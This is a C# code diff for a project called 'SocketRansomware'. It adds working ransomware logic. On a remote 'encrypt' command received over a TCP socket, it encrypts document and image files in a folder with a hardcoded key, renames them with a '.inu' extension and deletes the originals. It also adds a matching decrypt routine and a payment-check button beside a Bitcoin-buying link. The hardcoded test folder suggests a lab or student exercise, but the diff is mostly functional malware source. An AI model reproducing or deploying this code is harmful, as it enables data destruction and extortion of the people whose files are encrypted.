@@ -11,11 +11,14 @@ using System.Net;
 using System.Net.Sockets;
 using System.Net.NetworkInformation;
 using System.Threading;
+using System.IO;
 
 namespace SocketRansomware
 {
     public partial class Form1 : Form
     {
+        readonly string[] extensions = { ".docx", ".hwp", ".jpg", ".png", ".txt", ".jpeg" };
+        private const string PATH = @"C:\Users\whs27\Desktop\test";
         TcpClient client;
         Thread receiveMessageThread = null;
         public Form1()
@@ -108,6 +111,10 @@ namespace SocketRansomware
                     net.Read(bytes, 0, bytes.Length); //스트림읽기 C++로따지면 recv함수
                     string str = Encoding.Default.GetString(bytes).Trim('\0');
                     string[] request = str.Split(';');
+                    if(request[0].Equals("encrypt"))
+                    {
+                        EncryptFiles(request[1]);
+                    }
                     Console.WriteLine(str);
                 }
                 catch (Exception e)
@@ -118,12 +125,62 @@ namespace SocketRansomware
             }
         }
 
-        private void lbAboutBit_Click(object sender, EventArgs e)
+        private void EncryptFiles(string key)
         {
+            String FolderName = @"C:\Users\whs27\Desktop\test";
+            System.IO.DirectoryInfo di = new System.IO.DirectoryInfo(FolderName);
+            foreach (System.IO.FileInfo Fileinfo in di.GetFiles())
+            {
+                foreach (string extension in extensions)
+                {
+                    if (Fileinfo.Extension.ToLower().CompareTo(extension) == 0)
+                    {
+                        String FileNameOnly = Fileinfo.Name.Substring(0, Fileinfo.Name.Length - 4);
+                        String FullFileName = Fileinfo.FullName;
 
+                        //   MessageBox.Show(FullFileName + " " + FileNameOnly);
+                        string newPath = FullFileName + ".inu";
+                        FileInfo outputFile = new FileInfo(newPath);
+                        using (FileStream fs = outputFile.Create())
+                        {
+                            Byte[] txt = File.ReadAllBytes(FullFileName);
+                            Byte[] newText = Crypto.Encrypt(txt, "bestinubestinu");
+                            fs.Write(newText, 0, newText.Length);
+                            File.Delete(FullFileName);
+
+                        }
+
+                    }
+                }
+
+            }
         }
 
-        private void EncrypteFile()
+        private void DecryptFiles(string key)
+        {
+            String FolderName = @"C:\Users\whs27\Desktop\test";
+            System.IO.DirectoryInfo di = new System.IO.DirectoryInfo(FolderName);
+            foreach (System.IO.FileInfo Fileinfo in di.GetFiles())
+            {
+                if (Fileinfo.Extension.ToLower().CompareTo(".inu") == 0)
+                {
+                    String FileNameOnly = Fileinfo.Name.Substring(0, Fileinfo.Name.Length - 4);
+                    String FullFileName = Fileinfo.FullName;
+                    string originFileName = FullFileName.Substring(0, FullFileName.Length - 4);
+                    //   MessageBox.Show(FullFileName + " " + FileNameOnly);
+                    FileInfo outputFile = new FileInfo(originFileName);
+                    using (FileStream fs = outputFile.Create())
+                    {
+                        Byte[] text = File.ReadAllBytes(FullFileName);
+                        Byte[] newText = Crypto.Decrypt(text, "bestinubestinu");
+                        fs.Write(newText, 0, newText.Length);
+                        File.Delete(FullFileName);
+                    }
+                }
+            }
+        }
+
+        private void lbAboutBit_Click(object sender, EventArgs e)
         {
 
         }
@@ -193,6 +250,16 @@ namespace SocketRansomware
         {
             linkLabel2.LinkVisited = true;
             System.Diagnostics.Process.Start("https://www.investopedia.com/articles/investing/082914/basics-buying-and-investing-bitcoin.asp");
+        }
+
+        private void btnCheckPayment_Click(object sender, EventArgs e)
+        {
+
+        }
+
+        private void btnDecrypt_Click(object sender, EventArgs e)
+        {
+            DecryptFiles("OA/gXL/pLOWde6Fvxvm2TpColTuzeK4lnebwmX/Ci1E=");
         }
     }
    
